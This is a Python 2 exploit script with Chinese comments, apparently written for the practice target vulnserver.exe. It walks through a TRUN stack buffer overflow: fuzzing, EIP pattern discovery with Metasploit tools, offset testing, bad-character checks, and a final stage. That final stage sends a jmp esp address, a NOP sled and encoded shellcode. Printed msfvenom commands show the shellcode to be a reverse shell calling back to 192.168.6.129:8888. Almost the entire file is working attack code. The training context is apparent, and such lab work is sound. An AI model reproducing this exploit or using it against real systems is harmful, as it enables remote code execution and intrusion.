#!/usr/bin/python2
# -*- coding: utf-8 -*-

import socket
import sys,os
import argparse

def title():
    print ("""
            ###############################################################
            #                    缓冲区溢出漏洞EXP&POC                    #
            #                 Date  :  2022-03-09 19:50:03                #
 	    #                 Author: NongCloud                           #
            #                 Github:https://github.com/NongCloud         #                    
            ###############################################################
    	""")

def payload(target,dport,string):
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) 
    connect = s.connect((target,dport))
    s.send(('TRUN /:./' + string))
    s.close() 
    
def poc_payload(target,dport):
    buffer= ["A"]
    counter=100
    while len(buffer) <= 30:
        buffer.append("A" * counter)
        counter=counter+200
    for string in buffer:
        print ("Fuzzing application with %s bytes" % len(string))
        payload(target,dport,string)

class expattack():
    def get_eip(self,target,dport):
        #(1)使用字符集测试获取溢出的EIP
        print ("""
              生成唯一字符
              /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 10000 > ./tmp/string.txt #字符集长度 
        """)
        with open('./tmp/string.txt') as file: 
            buffer = file.read().rstrip()
        payload(target,dport,buffer)

    def test_eip(self,target,dport,offset):
        #(2)使用msf计算偏移量
        print ("""
              字符偏移量计算方式
              offset = /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 35724134(EIP)
        """)
        buffer = "A" * offset + "B" * 5
        payload(target,dport,buffer)

    def Badcharacters(self,target,dport,offset):
        #(3)查看程序坏字符
        shellcode= (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
        buffer = "A" * offset + "B" * 4 + shellcode
        payload(target,dport,buffer)

    def exploit(self,target,dport,offset):
        print ('''
            获取反弹shell
            msfvenom -p windows/shell_reverse_tcp LHOST=192.168.6.129 LPORT=8888 -e x86/shikata_ga_nai -b "\x00\x0a\x0d" -f c 
            msfvenom -p linux/x86/shell_reverse_tcp lhost=192.168.6.129 lport=8888 -e x86/shikata_ga_nai -b "\x00" -f c 
        ''')
        sd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sd.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sd.bind(('0.0.0.0', 8888))
        sd.listen(1)
        shellcode = (
"\xd9\xed\xd9\x74\x24\xf4\xba\xd9\xb0\xb9\xe1\x5d\x2b\xc9\xb1"
"\x52\x83\xc5\x04\x31\x55\x13\x03\x8c\xa3\x5b\x14\xd2\x2c\x19"
"\xd7\x2a\xad\x7e\x51\xcf\x9c\xbe\x05\x84\x8f\x0e\x4d\xc8\x23"
"\xe4\x03\xf8\xb0\x88\x8b\x0f\x70\x26\xea\x3e\x81\x1b\xce\x21"
"\x01\x66\x03\x81\x38\xa9\x56\xc0\x7d\xd4\x9b\x90\xd6\x92\x0e"
"\x04\x52\xee\x92\xaf\x28\xfe\x92\x4c\xf8\x01\xb2\xc3\x72\x58"
"\x14\xe2\x57\xd0\x1d\xfc\xb4\xdd\xd4\x77\x0e\xa9\xe6\x51\x5e"
"\x52\x44\x9c\x6e\xa1\x94\xd9\x49\x5a\xe3\x13\xaa\xe7\xf4\xe0"
"\xd0\x33\x70\xf2\x73\xb7\x22\xde\x82\x14\xb4\x95\x89\xd1\xb2"
"\xf1\x8d\xe4\x17\x8a\xaa\x6d\x96\x5c\x3b\x35\xbd\x78\x67\xed"
"\xdc\xd9\xcd\x40\xe0\x39\xae\x3d\x44\x32\x43\x29\xf5\x19\x0c"
"\x9e\x34\xa1\xcc\x88\x4f\xd2\xfe\x17\xe4\x7c\xb3\xd0\x22\x7b"
"\xb4\xca\x93\x13\x4b\xf5\xe3\x3a\x88\xa1\xb3\x54\x39\xca\x5f"
"\xa4\xc6\x1f\xcf\xf4\x68\xf0\xb0\xa4\xc8\xa0\x58\xae\xc6\x9f"
"\x79\xd1\x0c\x88\x10\x28\xc7\xbd\xee\x02\x9f\xaa\xec\x62\xbd"
"\x92\x78\x84\xab\xf2\x2c\x1f\x44\x6a\x75\xeb\xf5\x73\xa3\x96"
"\x36\xff\x40\x67\xf8\x08\x2c\x7b\x6d\xf9\x7b\x21\x38\x06\x56"
"\x4d\xa6\x95\x3d\x8d\xa1\x85\xe9\xda\xe6\x78\xe0\x8e\x1a\x22"
"\x5a\xac\xe6\xb2\xa5\x74\x3d\x07\x2b\x75\xb0\x33\x0f\x65\x0c"
"\xbb\x0b\xd1\xc0\xea\xc5\x8f\xa6\x44\xa4\x79\x71\x3a\x6e\xed"
"\x04\x70\xb1\x6b\x09\x5d\x47\x93\xb8\x08\x1e\xac\x75\xdd\x96"
"\xd5\x6b\x7d\x58\x0c\x28\x8d\x13\x0c\x19\x06\xfa\xc5\x1b\x4b"
"\xfd\x30\x5f\x72\x7e\xb0\x20\x81\x9e\xb1\x25\xcd\x18\x2a\x54"
"\x5e\xcd\x4c\xcb\x5f\xc4"
        )
        jimesp = "\xaf\x11\x50\x62" #jmp esp 625011af vulnserver.exe
        buffer= "A"* offset + jimesp +'\x90'*32 + shellcode
        payload(target,dport,buffer)
    
def main():
    parser = argparse.ArgumentParser(description='Buffer overflow vulnerability')
    parser.add_argument('-m', '--mode', type=str,help=' 选择模式 ')
    parser.add_argument('-t', '--target', type=str, help=' 攻击目标 ')
    parser.add_argument('-p', '--dport', type=int, help=' 目标端口 ')
    parser.add_argument('-o', '--offset', type=int, help=' 漏洞偏移量 ')
    args = parser.parse_args()
    mode = args.mode
    target = args.target
    dport = args.dport
    offset = args.offset
    exp = expattack()
    if mode == "poc" and target and dport:
        poc_payload(target,dport)
    elif mode == "geteip" and target and dport:
        exp.get_eip(target,dport)
    elif mode == "t-eip"  and target and dport and offset:
        exp.test_eip(target,dport,offset)
    elif mode == "t-badchar" and target and dport and offset:
        exp.Badcharacters(target,dport,offset)
    elif mode == "exp" and target and dport and offset:
        exp.exploit(target,dport,offset)
    else:
        print ('''
            POC 检测:    python2 Buffer-overflow.py -m poc -t your-ip -p port 
            获取溢出eip: python2 Buffer-overflow.py -m geteip -t your-ip -p port
            eip溢出测试: python2 Buffer-overflow.py -m t-eip -t your-ip -p port -o offset
            坏字符测试:  python2 Buffer-overflow.py -m t-badchar -t your-ip -p port  -o offset
            exp溢出攻击: python2 Buffer-overflow.py -m exp -t your-ip -p port  -o offset
            ''')


if __name__ == '__main__':
    title()
    main()

